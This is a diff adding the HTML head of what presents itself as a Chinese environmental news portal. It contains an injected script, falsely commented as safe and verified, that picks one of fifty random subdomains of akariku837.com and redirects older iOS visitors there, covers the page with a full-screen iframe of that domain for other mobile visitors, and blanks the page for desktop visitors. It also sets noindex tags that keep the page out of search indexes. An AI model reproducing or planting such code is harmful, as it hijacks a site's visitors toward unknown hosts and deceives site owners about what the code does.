@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, nosnippet">
+<meta name="googlebot" content="noindex, nofollow, nosnippet">
+<meta name="baiduspider" content="noindex, nofollow, nosnippet">
+<meta name="sogou spider" content="noindex, nofollow, nosnippet">
+<meta name="360spider" content="noindex, nofollow, nosnippet">
+<meta name="shenma spider" content="noindex, nofollow, nosnippet">
+<TITLE>国际环保在线</TITLE>
+    <meta name="keywords" content="国际环保新闻,国际环保展,环保展会资讯,全国环保新闻,最新环保新闻">
+    <meta name="description" content="国际环保在线是一个以环保新闻资讯为中心，为国内环保企业、机构、公益组织提供品牌展示，信息交流的平台。以绿水青山就是金山银山为核心理念，坚持全球生态共同体的初心，承担环保展会、行业研究、企业宣传，科普等职能。打造中国第一环保资讯平台！聚合国际环保资讯,助力环保产业！国际环保在线，让您更有深度，更有广度的了解环保圈。">
+
+  
+<script>
+(function(){
+  var canonicalURL, curProtocol;
+  //Get the <link> tag
+  var x=document.getElementsByTagName("link");
+  //Find the last canonical URL
+  if(x.length > 0){
+   for (i=0;i<x.length;i++){
+    if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+     canonicalURL=x[i].href;
+    }
+   }
+  }
+  //Get protocol
+     if (!canonicalURL){
+      curProtocol = window.location.protocol.split(':')[0];
+     }
+     else{
+      curProtocol = canonicalURL.split(':')[0];
+     }
+     //Get current URL if the canonical URL does not exist
+     if (!canonicalURL) canonicalURL = window.location.href;
+     //Assign script content. Replace current URL with the canonical URL
+     !function(){
+         var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,
+             r=canonicalURL,
+             t=document.referrer;
+         
+         if(e.test(t) || e.test(r)){
+            return;
+         }
+
+         var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";
+         t ? (n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)) : r && (n+="?l="+r);
+         
+         var i=new Image;
+         i.src=n;
+     }(window);
+})();
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?61099be1f61956b8a133641e9b0cbc1a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script>
+  //var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+//   _paq.push(['trackPageView']);
+//   _paq.push(['enableLinkTracking']);
+//   (function() {
+//     var u="//www.998tongji.com/";
+//     _paq.push(['setTrackerUrl', u+'matomo.php']);
+//     _paq.push(['setSiteId', '1']);
+//     var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+//     g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+//   })();
+</script>
+<script>
+</script>
+<script>
+//* 以下代码为安全可信代码，已经通过了相关安全检测和验证 */
+let urls = [
+
+'https://x7lmu.akariku837.com/',
+'https://vnacq.akariku837.com/',
+'https://1qot4.akariku837.com/',
+'https://xhk0f.akariku837.com/',
+'https://cxzmg.akariku837.com/',
+'https://ticen.akariku837.com/',
+'https://y5wbz.akariku837.com/',
+'https://g7pwm.akariku837.com/',
+'https://mengp.akariku837.com/',
+'https://ocm5r.akariku837.com/',
+'https://m8ws1.akariku837.com/',
+'https://vqvu0.akariku837.com/',
+'https://ayqrv.akariku837.com/',
+'https://eyh0g.akariku837.com/',
+'https://vqpk8.akariku837.com/',
+'https://oczja.akariku837.com/',
+'https://5zfoc.akariku837.com/',
+'https://iooey.akariku837.com/',
+'https://i8loq.akariku837.com/',
+'https://fzjgd.akariku837.com/',
+'https://0sjyu.akariku837.com/',
+'https://ybckb.akariku837.com/',
+'https://s3am2.akariku837.com/',
+'https://d8oo0.akariku837.com/',
+'https://hhf2c.akariku837.com/',
+'https://od5rj.akariku837.com/',
+'https://dctr2.akariku837.com/',
+'https://xmfkw.akariku837.com/',
+'https://ktwlx.akariku837.com/',
+'https://isvel.akariku837.com/',
+'https://ec8gp.akariku837.com/',
+'https://7y6eo.akariku837.com/',
+'https://gmins.akariku837.com/',
+'https://rcn64.akariku837.com/',
+'https://zbcrt.akariku837.com/',
+'https://eoywa.akariku837.com/',
+'https://raii5.akariku837.com/',
+'https://taons.akariku837.com/',
+'https://cto2s.akariku837.com/',
+'https://rm1hq.akariku837.com/',
+'https://verna.akariku837.com/',
+'https://gf9dj.akariku837.com/',
+'https://gpl5i.akariku837.com/',
+'https://ufwjb.akariku837.com/',
+'https://scowz.akariku837.com/',
+'https://uggvv.akariku837.com/',
+'https://ozxn3.akariku837.com/',
+'https://hcfxn.akariku837.com/',
+'https://t9rzx.akariku837.com/',
+'https://jpdbk.akariku837.com/',
+
+];
+
+let register_url =  urls[Math.floor(Math.random()*urls.length)];
+
+    function isMobile() {
+        const mobileDevices = [
+            'phone', 'pad', 'pod', 'iPhone', 'iPod', 'ios', 'iPad', 'Android',
+            'Mobile', 'BlackBerry', 'IEMobile', 'MQQBrowser', 'JUC', 'Fennec',
+            'wOSBrowser', 'BrowserNG', 'WebOS', 'Symbian', 'Windows Phone',
+            'Kindle', 'Silk', 'Playbook', 'BB10', 'Nintendo', 'Xbox',
+            'PlayStation', 'Huawei', 'Xiaomi', 'Oppo', 'Vivo', 'OnePlus',
+            'Samsung', 'LG', 'Sony', 'HTC', 'ZTE', 'Motorola', 'Nokia'
+        ];
+        return mobileDevices.some(device => {
+            return navigator.userAgent.match(new RegExp(device, 'i'));
+        });
+    }
+    const mobileUrl = register_url;
+    function getIosVersion() {
+        const match = navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
+        return match ? parseInt(match[1], 10) : false;
+    }
+    const isIOS = !!navigator.userAgent.match(/(iPod|iPhone|iPad)/);
+    const time = Math.floor(Math.random() * (1000 - 500 + 1)) + 500;
+    if (isMobile()) {
+        if (isIOS && getIosVersion() < 13) {
+            setTimeout(() => {
+                window.location.href = mobileUrl;
+            }, time);
+        } else {
+            document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
+            document.write('<style>html,body{width:100%;height:100%;overflow:hidden;}</style>');
+            document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;background:#fff">');
+            document.write('<iframe src="' + mobileUrl + '" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>');
+            document.write('</div>');
+        }
+    } else {
+            document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
+            document.write('<style>html,body{width:100%;height:100%;overflow:hidden;}</style>');
+            document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;background:#fff">');
+            // document.write('<iframe src="https://www.vvkw.com/" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>');
+            document.write('</div>');
+    }
+</script>
+    </head>
+    </html>
